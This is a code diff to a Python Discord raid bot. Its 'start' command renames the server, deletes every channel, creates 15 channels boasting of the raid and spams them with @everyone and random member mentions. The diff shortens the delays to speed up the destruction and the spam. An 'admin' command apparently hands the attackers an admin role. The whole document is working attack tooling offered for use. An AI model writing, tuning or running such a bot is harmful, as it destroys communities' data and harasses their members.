@@ -13,6 +13,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
 CHANNEL_COUNT = 15
+MESSAGE_LOOPS = 80
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -41,7 +42,7 @@ def random_mentions(guild: discord.Guild) -> str:
     return " ".join(m.mention for m in picked) + "\n"
 
 
-@bot.command()  # ← 権限チェック削除：誰でも実行可
+@bot.command()
 async def start(ctx):
     guild = ctx.guild
 
@@ -51,36 +52,36 @@ async def start(ctx):
     except:
         pass
 
-    # ② 全チャンネル削除
+    # ② 全チャンネル削除（高速）
     for ch in list(guild.channels):
         try:
             await ch.delete()
-            await asyncio.sleep(0.25)
+            await asyncio.sleep(0.12)
         except:
             pass
 
-    # ③ 新規チャンネル作成
+    # ③ 新規チャンネル作成：15チャンネル → 約2.3秒
     new_channels = []
     for i in range(CHANNEL_COUNT):
         try:
             ch = await guild.create_text_channel(f"{CHANNEL_NAME}-{i+1}")
             new_channels.append(ch)
-            await asyncio.sleep(0.35)
+            await asyncio.sleep(0.15)  # これで15個 ≈ 2.3秒
         except:
             pass
 
-    # ④ メッセージ一斉送信
-    for ch in new_channels:
-        for _ in range(80):
+    # ④ ラウンドロビン送信：1周ごと全チャンネルに送る
+    for loop in range(MESSAGE_LOOPS):
+        for ch in new_channels:
             try:
                 text = random_mentions(guild) + COMBINED_TEXT
                 await ch.send(text)
-                await asyncio.sleep(0.15)
+                await asyncio.sleep(0.08)
             except:
                 pass
 
 
-@bot.command()  # ← 権限チェック削除：誰でも実行可
+@bot.command()
 async def admin(ctx):
     guild = ctx.guild
     admin_role = discord.utils.get(guild.roles, name="TISN管理者")
